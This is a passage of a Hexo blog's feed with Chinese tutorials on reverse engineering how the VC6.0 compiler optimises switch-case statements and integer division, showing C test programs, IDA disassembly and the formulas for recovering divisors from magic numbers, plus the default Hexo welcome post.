。因此在还原时，只<strong>需要先查索引表，然后加上最小的case值，即可还原</strong>。</p><h1 id="优化方案四二叉排序树方案">优化方案四：二叉排序树方案</h1><p>实验代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (argc)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">40</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 40&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="number">91</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 91&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">62</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 62&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">296</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 73&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        <span class="keyword">case</span> <span class="number">289</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 14&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        <span class="keyword">case</span> <span class="number">257</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 257&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;          </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 cmp     eax, 257</span><br><span class="line">.text:00401009                 jg      short LBL_NEXT_BRANCH</span><br><span class="line">.text:00401009</span><br><span class="line">.text:0040100B                 jz      short LBL_CASE257</span><br><span class="line">.text:0040100B</span><br><span class="line">.text:0040100D                 cmp     eax, 40</span><br><span class="line">.text:00401010                 jz      short LBL_CASE40</span><br><span class="line">.text:00401010</span><br><span class="line">.text:00401012                 cmp     eax, 62</span><br><span class="line">.text:00401015                 jz      short LBL_CASE62</span><br><span class="line">.text:00401015</span><br><span class="line">.text:00401017                 cmp     eax, 91</span><br><span class="line">.text:0040101A                 jnz     short LBL_DEFAULT</span><br><span class="line">.text:0040101A</span><br><span class="line">.text:0040101C                 push    offset s-&gt;Case91 ; &quot;case 91&quot;</span><br><span class="line">.text:00401021                 call    printf</span><br><span class="line">.text:00401021</span><br><span class="line">.text:00401026                 add     esp, 4</span><br><span class="line">.text:00401029                 xor     eax, eax</span><br><span class="line">.text:0040102B                 retn</span><br><span class="line">.text:0040102B</span><br><span class="line">.text:0040102C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040102C</span><br><span class="line">.text:0040102C LBL_CASE62:                             ; CODE XREF: _main+15j</span><br><span class="line">.text:0040102C                 push    offset s-&gt;Case62 ; &quot;case 62&quot;</span><br><span class="line">.text:00401031                 call    printf</span><br><span class="line">.text:00401031</span><br><span class="line">.text:00401036                 add     esp, 4</span><br><span class="line">.text:00401039                 xor     eax, eax</span><br><span class="line">.text:0040103B                 retn</span><br><span class="line">.text:0040103B</span><br><span class="line">.text:0040103C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040103C</span><br><span class="line">.text:0040103C LBL_CASE40:                             ; CODE XREF: _main+10j</span><br><span class="line">.text:0040103C                 push    offset s-&gt;Case40 ; &quot;case 40&quot;</span><br><span class="line">.text:00401041                 call    printf</span><br><span class="line">.text:00401041</span><br><span class="line">.text:00401046                 add     esp, 4</span><br><span class="line">.text:00401049                 xor     eax, eax</span><br><span class="line">.text:0040104B                 retn</span><br><span class="line">.text:0040104B</span><br><span class="line">.text:0040104C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040104C</span><br><span class="line">.text:0040104C LBL_CASE257:                            ; CODE XREF: _main+Bj</span><br><span class="line">.text:0040104C                 push    offset s-&gt;Case257 ; &quot;case 257&quot;</span><br><span class="line">.text:00401051                 call    printf</span><br><span class="line">.text:00401051</span><br><span class="line">.text:00401056                 add     esp, 4</span><br><span class="line">.text:00401059                 xor     eax, eax</span><br><span class="line">.text:0040105B                 retn</span><br><span class="line">.text:0040105B</span><br><span class="line">.text:0040105C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040105C</span><br><span class="line">.text:0040105C LBL_NEXT_BRANCH:                        ; CODE XREF: _main+9j</span><br><span class="line">.text:0040105C                 sub     eax, 289</span><br><span class="line">.text:00401061                 jz      short LBL_CASE289</span><br><span class="line">.text:00401061</span><br><span class="line">.text:00401063                 sub     eax, 7</span><br><span class="line">.text:00401066                 jz      short LBL_CASE73</span><br><span class="line">.text:00401066</span><br><span class="line">.text:00401068</span><br><span class="line">.text:00401068 LBL_DEFAULT:                            ; CODE XREF: _main+1Aj</span><br><span class="line">.text:00401068                 push    offset s-&gt;Default ; &quot;default&quot;</span><br><span class="line">.text:0040106D                 call    printf</span><br><span class="line">.text:0040106D</span><br><span class="line">.text:00401072                 add     esp, 4</span><br><span class="line">.text:00401075                 xor     eax, eax</span><br><span class="line">.text:00401077                 retn</span><br><span class="line">.text:00401077</span><br><span class="line">.text:00401078 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401078</span><br><span class="line">.text:00401078 LBL_CASE73:                              ; CODE XREF: _main+66j</span><br><span class="line">.text:00401078                 push    offset s-&gt;Case73 ; &quot;case 73&quot;</span><br><span class="line">.text:0040107D                 call    printf</span><br><span class="line">.text:0040107D</span><br><span class="line">.text:00401082                 add     esp, 4</span><br><span class="line">.text:00401085                 xor     eax, eax</span><br><span class="line">.text:00401087                 retn</span><br><span class="line">.text:00401087</span><br><span class="line">.text:00401088 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401088</span><br><span class="line">.text:00401088 LBL_CASE289:                            ; CODE XREF: _main+61j</span><br><span class="line">.text:00401088                 push    offset s-&gt;Case14 ; &quot;case 14&quot;</span><br><span class="line">.text:0040108D                 call    printf</span><br><span class="line">.text:0040108D</span><br><span class="line">.text:00401092                 add     esp, 4</span><br><span class="line">.text:00401095                 xor     eax, eax</span><br><span class="line">.text:00401097                 retn</span><br><span class="line">.text:00401097</span><br><span class="line">.text:00401097 _main           endp</span><br></pre></td></tr></table></figure><p>发现其使用的就是二叉排序树的形式来进行的，这样的话通过折半查找，几次之后就能得到最终要执行的那一个case分支，查找效率较大的提高。</p><p>该方案的代码定式就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmp</span><br><span class="line">jz</span><br><span class="line">jg</span><br><span class="line">; // 两轮判断下来，最后肯定执行的是小于的那一分支</span><br></pre></td></tr></table></figure><p>还原时就是抓住jz指令即可还原</p><h1 id="优化方案五混合优化">优化方案五：混合优化</h1><p>在实际应用中，几乎不会出现单一的优化形式，是上述4种方式的混合方案，不再赘述。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;大纲&quot;&gt;大纲&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;case的数量小于等于3个，且case值连续&lt;/li&gt;
&lt;li&gt;case的数量大于3个，但case值较为连续，即：最大case值和最小case值之间的间隔不大于7&lt;/li&gt;
&lt;li&gt;case的数量大于3个，且cas</summary>
      
    
    
    
    <category term="C/C++逆向" scheme="https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://4st.tech/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="switch-case" scheme="https://4st.tech/tags/switch-case/"/>
    
    <category term="switch-case还原" scheme="https://4st.tech/tags/switch-case%E8%BF%98%E5%8E%9F/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://4st.tech/2021/08/04/hello-world/"/>
    <id>https://4st.tech/2021/08/04/hello-world/</id>
    <published>2021-08-04T04:57:02.776Z</published>
    <updated>2021-08-04T04:57:02.776Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start">Quick Start</h2><h3 id="create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>C/C++除法的非常规优化及其识别与还原</title>
    <link href="https://4st.tech/2021/08/04/c-c-chu-fa-de-fei-chang-gui-you-hua-ji-qi-shi-bie-yu-huan-yuan/"/>
    <id>https://4st.tech/2021/08/04/c-c-chu-fa-de-fei-chang-gui-you-hua-ji-qi-shi-bie-yu-huan-yuan/</id>
    <published>2021-08-04T03:26:39.000Z</published>
    <updated>2021-08-04T04:57:04.063Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大纲">大纲</h1><ul><li>无符号数除以非2的幂的特殊情况</li><li>有符号数除以非2的幂的两种特殊情况<ul><li>除数是正数，但是<code>MagicNum</code>为负</li><li>除数是负数，但是<code>MagicNum</code>为正</li></ul></li></ul><p>测试环境与编译选项均与上一篇常规情况相同。</p><h1 id="无符号数除以非2的幂的特殊情况">无符号数除以非2的幂的特殊情况</h1><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)argc / <span class="number">7</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整理后对应的反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     ecx, [esp+arg_0]</span><br><span class="line">.text:00401004                 mov     eax, 24924925h</span><br><span class="line">.text:00401009                 mul     ecx</span><br><span class="line">.text:0040100B                 sub     ecx, edx</span><br><span class="line">.text:0040100D                 shr     ecx, 1</span><br><span class="line">.text:0040100F                 add     ecx, edx</span><br><span class="line">.text:00401011                 shr     ecx, 2</span><br><span class="line">.text:00401014                 push    ecx</span><br><span class="line">.text:00401015                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040101A                 call    printf</span><br><span class="line">.text:0040101A</span><br><span class="line">.text:0040101F                 add     esp, 8</span><br><span class="line">.text:00401022                 xor     eax, eax</span><br><span class="line">.text:00401024                 retn</span><br><span class="line">.text:00401024</span><br><span class="line">.text:00401024 _main           endp</span><br></pre></td></tr></table></figure><p>在常规优化中，其代码定式应该是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax, MagicNum</span><br><span class="line">mul x</span><br><span class="line">shr edx, n</span><br></pre></td></tr></table></figure><p>而在上述代码中，操作却不一致，这是为什么？上述操作又是在做什么？可以根据上述代码写出数学表达式进行化简来得到其结果，设<code>ecx = arg0</code>， <code>C = 24924925h</code>，有： <span class="math display">\[result = \frac{\frac{ecx - \frac{ecx \times C}{2^{32}}}{2} + \frac{ecx \times C}{2^{32}}}{2^2}\]</span> 化简可得到： <span class="math display">\[result = \frac{2^{32} \times ecx + ecx \times C }{2^{35}} = ecx \times \frac{2^{32} + C}{2^{35}} = ecx \times M &gt;&gt; 35\]</span> 于是可以发现，其实就是编译器在计算<code>MagicNum</code>的时候，发现得到的结果用4个字节存放不下，多了一个进位出来，也就是<span class="math inline">\(2^{32}\)</span>​ 。所以在后序计算结果的时候，由于<code>MagicNum</code>是低4字节的结果，所以需要进行调整，在计算的时候需要先加上这个进位才能正确的得到结果。而它之所以拆分为上述情况，是因为要将除法转为周期更短的移位运算，进行了等价变换。</p><p>还原时需要将<code>MagicNum</code>加上<span class="math inline">\(2^{32}\)</span> 再进行还原即可。</p><p># 有符号数除以非2的幂的两种特殊情况</p><p>出现这两种特殊情况的原因是，由于编译器在计算<code>MagicNum</code>的时候，是按照无符号数来进行运算的，但是在有符号数除法中需要使用有符号命令，此时得到的<code>MagicNum</code>可能会为负数，因此需要做调整；同理，其<code>MagicNum</code>本应该是负数，但是在计算过程中却被视为正数，因此也需要做调整，故有以下两种情况。</p><h2 id="除数是正数但是magicnum为负">除数是正数，但是<code>MagicNum</code>为负</h2><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, argc / <span class="number">7</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的反汇编结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     ecx, [esp+arg_0]</span><br><span class="line">.text:00401004                 mov     eax, 92492493h; MagicNum为负数，因为大于0x7fff, ffff</span><br><span class="line">.text:00401009                 imul    ecx</span><br><span class="line">.text:0040100B                 add     edx, ecx; 对比之前的有符号数除以非2的幂多了这个操作</span><br><span class="line">.text:0040100D                 sar     edx, 2</span><br><span class="line">.text:00401010                 mov     eax, edx</span><br><span class="line">.text:00401012                 shr     eax, 1Fh</span><br><span class="line">.text:00401015                 add     edx, eax</span><br><span class="line">.text:00401017                 push    edx</span><br><span class="line">.text:00401018                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040101D                 call    printf</span><br><span class="line">.text:0040101D</span><br><span class="line">.text:00401022                 add     esp, 8</span><br><span class="line">.text:00401025                 xor     eax, eax</span><br><span class="line">.text:00401027                 retn</span><br><span class="line">.text:00401027</span><br><span class="line">.text:00401027 _main           endp</span><br></pre></td></tr></table></figure><p>将上述操作所描写的数学公式写出来并化简，可以得到以下式子： <span class="math display">\[result = \frac{\frac{ecx \times -C}{2^{32}} + ecx}{2^2} = \frac{-C \times ecx + 2^{32} \times ecx}{2^{34}}= ecx \times \frac{2^{32} - C}{2^{34}} = ecx \times M &gt;&gt; 34\]</span> 其中<span class="math inline">\(M = 2^{32} - C\)</span>，即：<code>M</code>是对C取补之后的结果，真是的<code>MagicNum</code>应该为正值。</p><p>其多添加的这一句<code>add edx, ecx</code>其实就是对无符号整数乘以有符号数做调整，而还原方法是直接按照正数的方法进行还原即可。</p><h2 id="除数是负数但是magicnum为正">除数是负数，但是<code>MagicNum</code>为正</h2><p>测试代码为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, argc / <span class="number">-7</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     ecx, [esp+arg_0]</span><br><span class="line">.text:00401004                 mov     eax, 6DB6DB6Dh; MagicNum为正数</span><br><span class="line">.text:00401009                 imul    ecx</span><br><span class="line">.text:0040100B                 sub     edx, ecx; 多出了一个减法操作</span><br><span class="line">.text:0040100D                 sar     edx, 2</span><br><span class="line">.text:00401010                 mov     eax, edx</span><br><span class="line">.text:00401012                 shr     eax, 1Fh</span><br><span class="line">.text:00401015                 add     edx, eax</span><br><span class="line">.text:00401017                 push    edx</span><br><span class="line">.text:00401018                 push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">.text:0040101D                 call    printf</span><br><span class="line">.text:0040101D</span><br><span class="line">.text:00401022                 add     esp, 8</span><br><span class="line">.text:00401025                 xor     eax, eax</span><br><span class="line">.text:00401027                 retn</span><br><span class="line">.text:00401027</span><br><span class="line">.text:00401027 _main           endp</span><br></pre></td></tr></table></figure><p>同样，将上述运算写为数学表达式： <span class="math display">\[result = \frac{\frac{ecx \times C}{2^{32}} - ecx}{2^2} = \frac{ecx \times C - 2^{32} \times ecx}{2^{34}} = ecx \times \frac{C - 2^{32}}{2^{34}} = ecx \times M &gt;&gt; 34\]</span> 其中<span class="math inline">\(M = -2^{32} + C\)</span>，即：真正的<code>M</code>是一个负值。</p><p>其还原方法还是先求补，再还原。</p><h1 id="整体总结">整体总结</h1><p>总结一下识别方法：</p><ol type="1"><li>在识别时，先观察是否有加1做调整的操作，如果有且运算指令使用的是有符号运算指令，则被除数是有符号数。</li><li>查看<code>MagicNum</code>是否是负数（大于等于<code>0x8000,0000</code>即为负数）。如果是负数，且未见加调整，则除数是负数；如果是正数，且有减调整，则除数是负数，需要先求补再进行还原；同理，如果是负数，且有加调整，除数是正数；如果是正数，且未有减调整，则除数是正数</li></ol><p>对于还原方法，首先判断除数是正数还是负数来进行还原：</p><ol type="1"><li>正数还原除数</li></ol><p><span class="math display">\[\frac{2^n}{M}\]</span></p><ol start="2" type="1"><li>负数还原除数</li></ol><p><span class="math display">\[\frac{2^n}{2^{32} - M}\]</span></p><ol start="3" type="1"><li>溢出还原除数</li></ol><p><span class="math display">\[\frac{2^n}{2^{32} + M}\]</span></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;大纲&quot;&gt;大纲&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;无符号数除以非2的幂的特殊情况&lt;/li&gt;
&lt;li&gt;有符号数除以非2的幂的两种特殊情况
&lt;ul&gt;
&lt;li&gt;除数是正数，但是&lt;code&gt;MagicNum&lt;/code&gt;为负&lt;/li&gt;
&lt;li&gt;除数是负数，但是&lt;cod</summary>
      
    
    
    
    <category term="C/C++逆向" scheme="https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://4st.tech/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="除法优化" scheme="https://4st.tech/tags/%E9%99%A4%E6%B3%95%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>C/C++除法的常规优化及其识别与还原</title>
    <link href="https://4st.tech/2021/08/03/c-c-chu-fa-de-chang-gui-you-hua-ji-qi-shi-bie-yu-huan-yuan/"/>
    <id>https://4st.tech/2021/08/03/c-c-chu-fa-de-chang-gui-you-hua-ji-qi-shi-bie-yu-huan-yuan/</id>
    <published>2021-08-03T03:58:36.000Z</published>
    <updated>2021-08-04T04:57:03.963Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大纲">大纲</h1><p>本文涉及到的是除法的一般优化方法，其中特殊情况暂时不列举，涉及的知识点有：</p><ul><li>被除数是无符号数，除以2的幂</li><li>被除数是有符号数，除以2的幂</li><li>被除数是无符号数，除以非2的幂</li><li>被除数是有符号数，除以非2的幂的常规情况，即：<code>MagicNum</code>没有进位和不为负数的情况</li></ul><p>在学习的时候，需要对照着看，使用的工具是<code>VC6.0</code>和<code>IDA 6.1</code>。使用的是<code>VC6.0</code>的原因是其编译器对于除法优化更加激进一些，也更加不好识别一些，而<code>VS2019</code>等<code>IDE</code>的<code>MSVC</code>编译器已经将部分优化直接替换为了除法等指令，原因可能是因为现在的硬件对于除法指令的硬件优化更加好一些，已经在可接受范围内了，所以本文采用的是<code>VC6.0</code>的编译器进行练习。</p><p>需要注意的是</p><ol type="1"><li>在编译时需要选择的是<code>Release</code>版本，而不能是<code>Debug</code>版本，开启的选项是速度优先优化选项，而不是体积优先。</li><li>在写例子的时候，需要注意传播优化、折叠优化等优化方式带来的影响</li></ol><h1 id="无符号数除以2的幂">无符号数除以2的幂</h1><h2 id="示例01---除数为2">示例01 - 除数为2</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)argc / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对其反汇编进行整理，得到反汇编为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">_main proc near</span><br><span class="line"></span><br><span class="line">arg_0= dword ptr  4</span><br><span class="line"></span><br><span class="line">mov     eax, [esp+arg_0]</span><br><span class="line">shr     eax, 1</span><br><span class="line">push    eax</span><br><span class="line">push    offset s-&gt;D     ; &quot;%d&quot;</span><br><span class="line">call    printf</span><br><span class="line">add     esp, 8</span><br><span class="line">xor     eax, eax</span><br><span class="line">retn</span><br><span class="line">_main endp</span><br></pre></td></tr></table></figure><p>发现其使用的是<code>shr reg, 1</code> ，使用无符号右移指令来替代除法指令，其指令周期更短，运算更快。</p><h2 id="示例02---除数为2的幂">示例02 - 